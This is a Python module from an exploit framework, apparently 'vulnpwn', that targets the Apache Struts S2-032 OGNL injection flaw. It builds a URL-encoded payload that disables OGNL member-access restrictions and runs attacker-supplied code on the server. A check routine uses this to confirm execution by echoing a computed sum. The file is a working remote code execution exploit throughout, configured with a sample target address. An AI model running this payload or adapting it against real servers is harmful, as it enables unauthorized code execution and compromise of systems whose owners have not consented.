#!/usr/bin/python
# -*-  coding: utf-8 -*-

##
# Current source: https://github.com/open-security/vulnpwn/
##

# from lib.base import module
from lib.core import exploit
from lib.utils import randoms
import urllib
import requests


class Module(exploit.Exploit):

    __info__ = {
        'name': 'Apache Struts S2_032 Remote Code Execution',
        'author': ['Open-Security'],
        'description': '',
        'comments': '',
        'references': [],
        'license': 'APACHE_LICENSE',
        'options': {
            'RHOST': ['172.16.176.226', 'the target host'],
            'RPORT': [8080, 'the target port'],
            'TARGETURI': [
                '/struts2-blank/example/HelloWorld.action',
                'target uri to request'
            ]
        }
    }

    def __init__(self):
        exploit.Exploit.__init__(self)

    def generate_rce_payload(self, code):
        payload = "method:"
        payload += urllib.quote("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS")
        payload += ","
        payload += urllib.quote(code)
        payload += ","
        payload += urllib.quote("1?#xx:#request.toString")
        return payload

    def check(self):
        int_x = int(randoms.rand_text_numeric(2))
        int_y = int(randoms.rand_text_numeric(2))

        code = "#abcd=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.print(new java.lang.Integer(%d+%d))," % (int_x, int_y)
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.close()"

        payload = self.generate_rce_payload(code)
        uri = 'http://%s:%s%s' % (self.options['RHOST']['value'],
                                  self.options['RPORT']['value'],
                                  self.options['TARGETURI']['value'])
        self.output("Exploiting - %s" % uri)

        uri = "%s?%s" % (uri, payload)
        mark = randoms.rand_text_alpha(4)

        resp = requests.Session().post(uri, data={'test': mark})
        flag = "%s%d%s" % (mark, int_x + int_y, mark)
        if resp and resp.status_code == 200 and flag in resp.text:
            self.output("Target is vulanable")

    def main(self, *args, **kwargs):
        """custom main func for special task"""
        self.check()
